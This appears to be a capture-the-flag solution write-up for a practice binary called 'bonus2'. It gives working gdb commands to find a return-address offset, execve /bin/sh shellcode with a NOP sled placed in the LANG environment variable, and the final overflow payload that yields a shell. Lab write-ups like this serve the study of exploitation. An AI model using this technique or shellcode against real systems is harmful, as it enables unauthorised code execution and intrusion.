# Solution

the program takes two argument one 40 length buf and 32 length buf and merge them together
then concatenate it to another buffer which have a greeting word
who depend on the LANG env variable
we will work with nl

```sh
export LANG=nl
```

find offset for return pointer overwrite

```sh
(gdb) r $(python -c 'print "A" * 40') aaaabaaacaaadaaaeaaafaaagaaahaaa
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') aaaabaaacaaadaaaeaaafaaagaaahaaa
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaa
```

```sh
Program received signal SIGSEGV, Segmentation fault.
0x61616761 in ?? ()
```

offset is 23
put shellcode in env variable

```sh
export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

find shellcode address

```sh
0xbffffe6b:	 "LANG=nl\220...
```

build payload:

```sh
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print"B" * 23 + "\x80\xfe\xff\xbf"')
#                    padding 1st buf       padding 2nd buf             shcode address
```
